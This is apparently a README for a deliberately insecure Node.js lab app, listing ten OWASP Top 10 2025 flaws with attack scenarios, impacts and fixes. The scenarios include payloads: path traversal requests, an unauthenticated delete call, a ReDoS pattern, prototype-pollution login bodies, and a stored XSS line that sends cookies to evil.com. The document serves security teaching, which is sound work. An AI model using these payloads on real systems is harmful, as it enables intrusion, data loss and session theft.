# 🐞 Web Application Security Vulnerability Report (Research Lab)

> ⚠️ Educational / Research Use Only  
> This document describes security weaknesses in a controlled web application environment for learning and defensive security analysis.

## ⚡ Quick Access Navigation
* [🚀 Getting Started](#-getting-started)
* [🔓 01. Broken Access Control](#1--insecure-direct-object-reference-idor--broken-access-control)
* [🔐 02. Default Credentials](#2--default-credentials-misconfiguration)
* [📁 03. Unrestricted File Upload](#3--unrestricted-file-upload-vulnerability)
* [⚠️ 04. Supply Chain Failure](#4--software-supply-chain-failure)
* [🚨 05. Exception Mishandling](#5-mishandling-of-exceptional-conditions-owasp-a102025)
* [📌 Summary Table](#-summary-of-security-issues)
# 🚀 Getting Started

This guide explains how to set up and run the web application locally.

---

# 📦 Prerequisites

Before running the project, make sure you have installed:

- Node.js (v16 or higher)
- npm (comes with Node.js)
- Git
- A modern web browser (Chrome, Firefox, Edge)

---

# 📥 Installation

## 1. Clone the repository

```bash
git clone https://github.com/MoeinShahi/InsecureApp-OWASP-Top10-2025.git
```
## 2.Navigate to the project folder
```bash
cd InsecureApp-OWASP-Top10-2025
```

## 3. Install dependencies
```bash
npm install
```
## 4.Run the app
```bash
node app.js
```
## 5.Visit the app on browser
http://localhost:3000/

---

# 1. 🔓 Insecure Direct Object Reference (IDOR) / Broken Access Control

## 📖 Description
The application incorrectly uses **URL parameters (e.g., `?user=`)** to determine which account data is displayed. The system does not properly validate whether the authenticated user is authorized to access the requested resource.

This allows attackers to manipulate the URL to access other users’ accounts and data.

---

## ⚠️ Risks

### 👤 Normal User Impact
- Access to other users’ dashboards by modifying URL parameters
- Unauthorized viewing of private documents and uploaded files
- Ability to perform actions (upload/delete/view) on other user accounts

---

## 🧪 Attack Scenario

After login, the application redirects users to a URL such as:
http://localhost:3000/dashboard?user=john
An attacker modifies the parameter:
http://localhost:3000/dashboard?user=victim
no server-side authorization check exists, the system loads the victim’s account data.
## 🧑‍💼 Admin Panel Abuse

### Description
The admin dashboard is accessible by URL manipulation:
http://localhost:3000/admin.html?user=admin

The system does not verify roles or authentication properly and relies only on URL parameters.

---

## 💥 Impact
- Unauthorized access to admin dashboard
- Deletion or modification of users in the database
- Full administrative privilege escalation

---

## 🛡️ Root Cause
- No server-side authorization checks
- Trusting client-side URL parameters
- Missing role-based access control (RBAC)

---

# 2. 🔐 Default Credentials Misconfiguration

## 📖 Description
The application retains default credentials (e.g., admin/admin) from development or deployment.

---

## 🧪 Attack Scenario
Username: admin
Password: admin
An attacker gains immediate admin access.
---

## 💥 Impact
- Full system compromise
- Access to all user data
- Database manipulation or deletion
- Administrative control of application

---

## 🛡️ Root Cause
- Failure to remove default credentials
- Lack of forced password reset on first login

---

# 3. 📁 Unrestricted File Upload Vulnerability

## 📖 Description
The application allows file uploads without validating file type, content, or safety restrictions.

Uploaded files are accessible directly via the web server.

---

## 🧪 Attack Scenario

1. User uploads an HTML file:
malicious.html
2. Server stores and serves the file publicly
3. When accessed, embedded JavaScript executes in the browser
---

## 💥 Impact
- Cross-Site Scripting (XSS)
- Session hijacking
- Phishing page creation
- Potential Remote Code Execution (RCE) depending on server configuration

---

## 🛡️ Root Cause
- No file type validation
- No MIME type checking
- Unsafe direct file serving

---

# 4. ⚠️ Software Supply Chain Failure (Dependency Confusion / Malicious Package Risk)

## 📖 Description
The application uses internal packages (e.g., `internal-logic`) without proper registry isolation or namespace protection.

If the package name is exposed publicly, attackers can publish malicious versions with the same name.

---

## 🧪 Attack Scenario

1. Internal dependency:
internal-logic

2. Package name becomes publicly known

3. Attacker publishes malicious package:
internal-logic@2.0.0
4. Developer runs update:
npm update

5. Package manager installs attacker-controlled version due to higher version priority.

---

## 💥 Impact
- Execution of malicious code during install/runtime
- Theft of environment variables and secrets
- Database credential exposure
- Persistent backdoor in application logic

---

## 🛡️ Root Cause
- Non-unique package naming
- No private registry enforcement
- No dependency integrity verification
- Unsafe automatic updates

---
# 5.Mishandling of Exceptional Conditions (OWASP A10:2025)

## 🧪 Attack Scenario: Verbose Error Disclosure
1.The Request: An attacker attempts to access a directory for a user that does not exist via the URL:
http://localhost:3000/files?user=invalid-user

2.The Condition: The server encounters a node:fs error because the folder is missing.

3.The Mishandling: The application does not "catch" this error. Instead, it crashes the specific request and sends the full System Stack Trace back to the browser.
🚩 Evidence (Terminal Output)
```bash
Error: ENOENT: no such file or directory, scandir '/home/SomeName/fileCloud/uploads/invalid-user'
    at Object.readdirSync (node:fs:1521:26)
    at /home/SomeName/fileCloud/app.js:119:15
```

# 📌 Summary of Security Issues

| Category | Severity | Impact |
|----------|----------|--------|
| Broken Access Control (IDOR) | Critical | Full account/admin takeover |
| Default Credentials | Critical | Immediate admin access |
| File Upload Vulnerability | High | XSS / RCE / phishing |
| Supply Chain Failure | Critical | Full system compromise |
| Mishandling Exceptions | Medium/High | Info Leak / Recon / DoS |

---

# ⚠️ Final Note

These vulnerabilities demonstrate how real-world systems can fail due to:

- Broken authorization logic
- Misconfiguration
- Unsafe file handling
- Weak dependency management

This document is intended strictly for **security research, education, and defensive improvement of systems in controlled environments only**.

---

# 6. 🗂️ Path Traversal on File Download (OWASP A01:2025)

## 📖 Description
The `/download` endpoint accepts `user` and `file` query parameters and constructs a file path using `path.join()` without sanitizing `../` sequences. An attacker can escape the `uploads/` directory and read any file on the server.

## 🧪 Attack Scenario
```
GET /download?user=alice&file=../../users.json
GET /download?user=alice&file=../../app.js
```

## 💥 Impact
- Disclosure of `users.json` (all usernames + plaintext passwords)
- Full source code exposure (`app.js`)
- Reading system files if Node process has sufficient OS permissions

## 🛡️ Root Cause
- No validation that the resolved path stays inside `uploads/<user>/`
- Should use `path.resolve()` and verify it starts with the allowed base dir

---

# 7. 🗑️ IDOR on File Delete — No Ownership Check (OWASP A01:2025)

## 📖 Description
The `/delete` route accepts `username` and `filename` from the POST body with no verification that the requester owns the target file. Any authenticated user (or unauthenticated client) can delete files belonging to any other user.

## 🧪 Attack Scenario
```bash
curl -X POST http://localhost:3000/delete \
  -H "Content-Type: application/json" \
  -d '{"username":"alice","filename":"secret.pdf"}'
```

## 💥 Impact
- Deletion of any user's files without authentication
- Data destruction / denial of service

## 🛡️ Root Cause
- Username taken from client-controlled request body
- No session or token binding identity to the request

---

# 8. 💥 ReDoS — Regular Expression Denial of Service (OWASP A05:2025)

## 📖 Description
The `/search` endpoint compiles a user-supplied string into a `RegExp` without validation or a timeout. Certain patterns trigger catastrophic backtracking in the V8 regex engine, blocking the single-threaded Node.js event loop.

## 🧪 Attack Scenario
```bash
# PoC — blocks server for several seconds with a small string
curl -X POST http://localhost:3000/search \
  -H "Content-Type: application/json" \
  -d '{"pattern":"^(a+)+$","username":"alice"}'
# Then the matching input (causes hang):
# Test string: "aaaaaaaaaaaaaaaaaaaaaaab"
```

## 💥 Impact
- Complete denial of service for all users
- Single malicious request can freeze the server

## 🛡️ Root Cause
- `new RegExp(userInput)` with no allow-list or safe-regex check
- Fix: validate pattern with a safe-regex library, or use a worker thread with a timeout

---

# 9. 🔡 JSON Type Confusion / Prototype Pollution on Login (OWASP A03:2025)

## 📖 Description
The login route parses JSON bodies via `express.json()` but passes raw values to `authenticate()`, which uses strict `===` comparison. However, sending a JSON body with `{"username":"__proto__","password":"x"}` pollutes `Object.prototype`, and sending boolean/object values for `password` can cause unexpected type coercion in downstream code.

## 🧪 Attack Scenario
```bash
# Prototype pollution attempt
curl -X POST http://localhost:3000/login \
  -H "Content-Type: application/json" \
  -d '{"username":"__proto__","password":{"isAdmin":true}}'

# Type confusion (boolean password)
curl -X POST http://localhost:3000/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":true}'
```

## 💥 Impact
- Prototype pollution can affect all objects in the runtime
- Type confusion may bypass downstream guards that use loose equality

## 🛡️ Root Cause
- No input type validation (username and password must be strings)
- Should reject non-string values before authentication

---

# 10. 📢 Stored XSS via Activity Log (OWASP A03:2025)

## 📖 Description
The `/activity` endpoint stores raw user-supplied `action` strings. The admin panel fetches these and renders them using `innerHTML` with no sanitization. Any user can inject a script payload that executes in the browser of any admin who views the activity log.

## 🧪 Attack Scenario
```bash
# Inject XSS payload as any user
curl -X POST http://localhost:3000/activity \
  -H "Content-Type: application/json" \
  -d '{"username":"alice","action":"<img src=x onerror=\"fetch('"'"'https://evil.com?c='"'"'+document.cookie)\">"}'

# Admin visits /admin.html → script executes → session/cookie stolen
```

## 💥 Impact
- Admin session cookie theft
- Credential harvesting
- Full admin account takeover

## 🛡️ Root Cause
- User input stored raw with no output encoding
- `innerHTML` used instead of `textContent`
- Fix: encode all output with DOMPurify or `textContent`

---

# 📌 Updated Summary Table

| # | Category | Severity | OWASP 2025 | Impact |
|---|----------|----------|------------|--------|
| 1 | Broken Access Control (IDOR) | Critical | A01 | Full account/admin takeover |
| 2 | Default Credentials | Critical | A05 | Immediate admin access |
| 3 | Unrestricted File Upload | High | A04 | XSS / RCE / phishing |
| 4 | Supply Chain Failure | Critical | A06 | Full system compromise |
| 5 | Exception Mishandling | Medium | A10 | Info leak / recon |
| 6 | Path Traversal | Critical | A01 | Server file disclosure |
| 7 | IDOR on Delete | High | A01 | Data destruction |
| 8 | ReDoS | High | A05 | Denial of service |
| 9 | JSON Type Confusion | Medium | A03 | Auth bypass / prototype pollution |
| 10 | Stored XSS | High | A03 | Admin session hijack |
